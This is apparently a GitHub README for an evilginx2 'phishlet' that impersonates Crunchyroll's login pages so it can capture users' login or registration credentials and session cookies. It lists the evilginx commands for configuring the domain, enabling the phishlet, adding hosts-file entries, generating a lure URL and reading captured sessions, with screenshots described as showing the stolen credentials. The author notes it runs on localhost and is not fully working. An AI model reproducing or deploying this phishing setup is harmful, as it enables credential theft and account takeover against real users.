# evilginx2-crunchyroll

crunchyroll phishlet for evilginx2.  
capture the login or register credentials.  
it's not fully working.  

using localhost.

## steps
download or clone this file and extract inside phishlet folder.  
start evilginx.  

`config domain crunchyroll.com`  
`config ipv4 127.0.0.1`

`phishlets hostname crunchyroll login.crunchyroll.com`  
`phishlets enable crunchyroll`  
`phishlets get-hosts crunchyroll`

	127.0.0.1 www.login.crunchyroll.com
	127.0.0.1 sso.login.crunchyroll.com
	127.0.0.1 static.login.crunchyroll.com
	
	# add to C:/Windows/System32/Driver/etc/hosts or /etc/hosts

`lures`  
`lures create crunchyroll -> check generated ID`  
`lures get-url ID`  

	https://sso.login.crunchyroll.com/innRipMA

go to your browser
clear all history
access the generated link
after login or registration get credentials

`sessions`  

## captures

![1](https://github.com/BieAnimaton/evilginx2-crunchyroll/assets/52220244/b7108ade-658c-4a0e-a017-aebca968f8cc)

![2](https://github.com/BieAnimaton/evilginx2-crunchyroll/assets/52220244/df2177dd-38e2-4db0-8855-197e3a44f498)

![3](https://github.com/BieAnimaton/evilginx2-crunchyroll/assets/52220244/4e4027fa-e65b-4555-8734-e5e9db1abe27)

credentials will appear in the console

![4](https://github.com/BieAnimaton/evilginx2-crunchyroll/assets/52220244/ddb43bac-1e5a-43fd-8a89-9c7524515a34)

sessions information

![5](https://github.com/BieAnimaton/evilginx2-crunchyroll/assets/52220244/82d44097-9113-4a36-a920-4ff474b43ad2)